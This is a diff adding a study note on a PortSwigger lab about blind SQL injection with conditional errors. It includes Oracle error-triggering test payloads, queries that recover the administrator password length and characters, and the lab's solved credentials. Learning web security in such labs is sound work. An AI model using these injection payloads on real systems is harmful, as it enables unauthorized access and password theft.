@@ -143,6 +143,21 @@ a charater (brute force the character `[a-z||0-9]`)
 - To solve the lab, log in as `administrator:xcanmptntagtdo2csy32`
 
 
+### [Lab: Blind SQL injection with conditional errors](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-errors)
+
+Vulnerable URL: https://domain/filter?category=category
+- This URL does not provide any elements that interacts with the injected SQL, if we cause errors in the database, the page will render an error
+
+Test payload: `cookie' AND (SELECT CASE WHEN (1=1) THEN 'a' ELSE TO_CHAR(1/0) END FROM dual) = 'a'--` and `cookie' AND (SELECT CASE WHEN (1=2) THEN 'a' ELSE TO_CHAR(1/0) END FROM dual) = 'a'--`
+- When the first query is injected the page loads normally, but when the second query is injected and error page is loaded due a 500 error (server error, database error in that case). The site has unhandled database errors, making it vulnerable to blind SQL injection
+
+To get the administrator, the logic is the same as the previous lab. It can also be done through Burp Intruder or an script. The only thing that change are the queries (different technique and database)
+- Query to get the password size: `' AND (SELECT CASE WHEN (LENGTH(password) > [size]) THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username = 'administrator') = 'a'--`
+- Query to enumerate the password: `' AND (SELECT CASE WHEN (SUBSTR(password, [position], 1) = '[character]') THEN 'a' ELSE TO_CHAR(1/0) END FROM users WHERE username = 'administrator') = 'a'--`
+
+To solve the lab log in as `administrator:r17fdjbk4v1bdmqqisd8`
+
+
 ## References
 - https://portswigger.net/web-security/sql-injection
 - https://portswigger.net/web-security/sql-injection/union-attacks
